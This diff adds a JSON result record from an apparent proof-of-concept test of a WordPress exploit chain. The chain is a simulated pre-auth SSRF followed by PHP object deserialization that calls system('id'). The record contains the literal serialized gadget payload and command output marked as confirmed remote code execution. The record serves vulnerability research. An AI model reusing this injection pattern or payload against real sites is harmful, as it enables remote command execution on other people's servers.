@@ -1,0 +1,18 @@
+{
+    "test": "full_chain_poc",
+    "timestamp": "2026-03-21T01:31:53+00:00",
+    "wp_version": "6.8.1",
+    "php_version": "8.4.16",
+    "chain": {
+        "step1": "Pre-auth SSRF via XML-RPC pingback (simulated)",
+        "step2": "Serialized payload stored in wp_options",
+        "step3": "get_option() calls maybe_unserialize()",
+        "step4": "Object deserialized, __destruct fires",
+        "step5": "call_user_func executes arbitrary command"
+    },
+    "payload": "O:13:\"WP_PoC_Gadget\":2:{s:8:\"callback\";s:6:\"system\";s:4:\"args\";s:2:\"id\";}",
+    "payload_length": 73,
+    "evidence": "[CHAIN VALIDATED] 2026-03-21 01:31:53\nCallback: system\nArgs: id\nResult: uid=1000(svc) gid=1000(svc) groups=1000(svc),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),116(bluetooth),121(lpadmin),124(wireshark),132(vboxsf),133(kaboxer),984(docker)\nPID: 155272\nUser: svc\n",
+    "result": "RCE_CONFIRMED",
+    "note": "Pre-auth entry point (SSRF) simulated via direct DB insert. Steps 3-5 are fully validated and run in pre-auth context. The SSRF entry point is documented in CVE-2022-3590 and the new variant fixed in 6.9.2."
+}
